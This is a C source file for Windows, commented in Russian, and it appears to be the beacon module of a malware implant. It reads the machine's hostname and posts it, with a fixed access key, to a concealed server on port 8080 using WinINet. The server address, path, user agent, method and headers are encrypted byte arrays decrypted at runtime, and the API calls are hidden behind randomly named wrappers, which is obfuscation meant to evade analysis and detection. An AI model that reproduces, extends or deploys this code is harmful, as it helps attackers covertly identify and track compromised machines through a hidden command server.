/*InternetOpen        - открываем глобальный доступ к WinINetInternetConnectA	- подключаемся к ip по заданному портуHttpOpenRequestA	- готовим http post-запросHttpSendRequestA	- отправляем запрос с заголовками и теломInternetReadFile	- читаем ответ сервераInternetCloseHandle	- освобождаем ресурсы*/#include <windows.h>#include <wininet.h>#include <stdio.h>/*#pragma comment(lib, "wininet.lib")*/#include "proxy_funck.c"int yupcuAozxx(const char* ip, INTERNET_PORT port, const char *path, char *data,  const char *headers){DWORD dataLen = strlen(data);                       // Вычисляем длину тела запросаchar buffer[4096];                                  // Длина тела запросаDWORD bytesRead;                                    // Кол-во реально прочитанных байтовunsigned char cmrhxPzwpaylmlv[] = {0x12, 0x76, 0x1D, 0x86, 0x20, 0xA5, 0x91, 0xBB, 0x67, 0x7E, 0xFE, 0xAF,'\0'};int ntughEvzzutszxhjzxd = 256;unsigned char nvtdxYcteqvcq[] = {'y','a','w','y','y','A','r','z','d','j','y','d','q','n','\0'};unsigned char zjgmxEkkkuyaiqzah[ntughEvzzutszxhjzxd];size_t xxkcnWkpew = strlen((char *)cmrhxPzwpaylmlv);size_t afzxaJridvahvoomkfb = strlen((char *)nvtdxYcteqvcq);nksxeOvdofmfwyszq(zjgmxEkkkuyaiqzah, nvtdxYcteqvcq, afzxaJridvahvoomkfb);oekdvTucorbxoxey(cmrhxPzwpaylmlv, xxkcnWkpew, zjgmxEkkkuyaiqzah);char userAgent_utka[sizeof(cmrhxPzwpaylmlv)];memcpy(userAgent_utka, cmrhxPzwpaylmlv, xxkcnWkpew + 1);HINTERNET ipxbyJibmafrzecsav = qjskdIggal(           // Инициализация WinInet сесииuserAgent_utka,INTERNET_OPEN_TYPE_DIRECT,                      // Подключение напрямую, без проксиNULL, NULL, 0);if (!ipxbyJibmafrzecsav) {exit(1);}HINTERNET yeajdLeotqw = psustXkgbomxr(              // Подключение к серверу по ip и портуipxbyJibmafrzecsav,ip,port,NULL, NULL,INTERNET_SERVICE_HTTP,                          // Используем http0, 0);if (!yeajdLeotqw) {exit(1);}unsigned char txzruZwxlsjo[] = {0x07, 0x91, 0xF4, 0x9B,'\0'};int lcxcpAkwqjhfquthpqo = 256;unsigned char mlcgwHmxftxktqlof[] = {'r','k','f','w','z','D','x','s','u','u','l','p','k','h','i','o','g','\0'};unsigned char dwxveIhgfntlayegxyt[lcxcpAkwqjhfquthpqo];size_t djrooPuvbvncaxwds = strlen((char *)txzruZwxlsjo);size_t qthvjPqeuxjvwi = strlen((char *)mlcgwHmxftxktqlof);nksxeOvdofmfwyszq(dwxveIhgfntlayegxyt, mlcgwHmxftxktqlof, qthvjPqeuxjvwi);oekdvTucorbxoxey(txzruZwxlsjo, djrooPuvbvncaxwds, dwxveIhgfntlayegxyt);char post_utka[sizeof(txzruZwxlsjo)];memcpy(post_utka, txzruZwxlsjo, djrooPuvbvncaxwds + 1);HINTERNET mhuuvRckggsxm = kfsriTdafygc(         // Открытие http запроса типа postyeajdLeotqw,post_utka,path,NULL,                                           // Версия http (NULL - по умолчанию)NULL,                                           // Рефер (не используем)NULL,                                           // Принятые типы (по умолчанию)INTERNET_FLAG_RELOAD,                           // Всегда загружать с сервера, не использовать кеш0);if (!iljfjXqnmtgouiq(                         // Отправка post запросаmhuuvRckggsxm,headers,-1,                                             // Указываем, что мы сами добавили нультерминатор(LPVOID)data,                                   // Указатель на post данныеdataLen)                                        // Длина тела запроса) {exit(1);}else {if(nuittKmtcwdhfog(                            // Читаем ответ от сервераmhuuvRckggsxm,buffer,                                     // Указатель на буфер, куда будет считан ответsizeof(buffer) - 1,                         // Кол-во байт, которые мы готовы принять (1 байт под нультерминатор)&bytesRead)                                 // Сколько байт прочитали&& bytesRead > 0) {buffer[bytesRead] = '\0';                                               // Завершаем строку нультерминатором}else {exit(1);}};zhmfnVyxhboetm(mhuuvRckggsxm);zhmfnVyxhboetm(yeajdLeotqw);zhmfnVyxhboetm(ipxbyJibmafrzecsav);return 0;}int rowcrBssuiudo(){char hostname[MAX_COMPUTERNAME_LENGTH + 1];             // Максимальный размер имени компьютера + 1 для '\0'DWORD size = sizeof(hostname);                          // Размер буфера для Hostnameif (zypadEzrbdlr(hostname, &size)) {} else {exit(1);}char data[MAX_COMPUTERNAME_LENGTH] = "15823405720242=";     // Ключ для того чтобы запрос был обработан + разделительstrncat(data, hostname, MAX_COMPUTERNAME_LENGTH - 1);       // Добавляем к data Hostnameunsigned char ecmdwDlwvzedvv[] = {0x8D, 0xAE,'\0'};int huuoyHyazxwp = 256;unsigned char sakrrHkvbcnhp[] = {'f','o','b','v','m','L','h','e','p','j','r','i','l','v','i','b','y','r','\0'};unsigned char visbsCuogugenksbeq[huuoyHyazxwp];size_t jjuefUloaykpcqxmfma = strlen((char *)ecmdwDlwvzedvv);size_t gvomuToiduzicnrxvn = strlen((char *)sakrrHkvbcnhp);nksxeOvdofmfwyszq(visbsCuogugenksbeq, sakrrHkvbcnhp, gvomuToiduzicnrxvn);oekdvTucorbxoxey(ecmdwDlwvzedvv, jjuefUloaykpcqxmfma, visbsCuogugenksbeq);char ip_utka[sizeof(ecmdwDlwvzedvv)];memcpy(ip_utka, ecmdwDlwvzedvv, jjuefUloaykpcqxmfma + 1);const char *temp_ip = ip_utka;INTERNET_PORT port = 8080;unsigned char invssEwbptpv[] = {0xF9, 0x81, 0x6B, 0x73, 0x73, 0xDD, 0x1D, 0xCF, 0x48, 0x8C, 0x06, 0x20, 0xA5, 0xE7, 0x7E, 0x67,'\0'};int yucfzUbmfegxpb = 256;unsigned char qcofeLuaudvrsgeq[] = {'s','t','f','z','q','X','f','k','a','l','d','\0'};unsigned char woepyHanyqehqho[yucfzUbmfegxpb];size_t frrqyYjfpzap = strlen((char *)invssEwbptpv);size_t wqbebOaqbtcfxzvdekwz = strlen((char *)qcofeLuaudvrsgeq);nksxeOvdofmfwyszq(woepyHanyqehqho, qcofeLuaudvrsgeq, wqbebOaqbtcfxzvdekwz);oekdvTucorbxoxey(invssEwbptpv, frrqyYjfpzap, woepyHanyqehqho);const char path_utka[sizeof(invssEwbptpv)];memcpy(path_utka, invssEwbptpv, frrqyYjfpzap + 1);const char *temp_path = path_utka;unsigned char ilxqtXjyvcfvy[] = {0xCE, 0x82, 0x2C, 0xB2, 0xCB, 0x54, 0xE0, 0xC3, 0x6D, 0x73, 0xAF, 0xA3, 0xF5, 0x4D, 0x70, 0x4D, 0xE3, 0x88, 0xF9, 0xF4, 0xF8, 0xE1, 0xE0, 0x17, 0x91, 0x2F, 0x48, 0x9B, 0x96, 0xA2, 0x3B, 0x54, 0x36, 0x77, 0x0E, 0x01, 0x64, 0x92, 0x0A, 0x2C, 0x31, 0x51, 0x22, 0x1B, 0xAA, 0x27, 0x84,'\0'};int ycnseFnwcongf = 256;unsigned char lukusZtvnsyrqmkf[] = {'h','y','r','k','i','X','l','p','v','q','q','d','v','r','c','i','k','t','\0'};unsigned char eevwzXrmajbndq[ycnseFnwcongf];size_t pypzkIblhscrw = strlen((char *)ilxqtXjyvcfvy);size_t mcydvXdmochzykamtryr = strlen((char *)lukusZtvnsyrqmkf);nksxeOvdofmfwyszq(eevwzXrmajbndq, lukusZtvnsyrqmkf, mcydvXdmochzykamtryr);oekdvTucorbxoxey(ilxqtXjyvcfvy, pypzkIblhscrw, eevwzXrmajbndq);const char headers_utka[sizeof(ilxqtXjyvcfvy)];memcpy(headers_utka, ilxqtXjyvcfvy, pypzkIblhscrw + 1);const char *temp_headers = headers_utka;yupcuAozxx(temp_ip, port, temp_path, data, temp_headers);return 0;}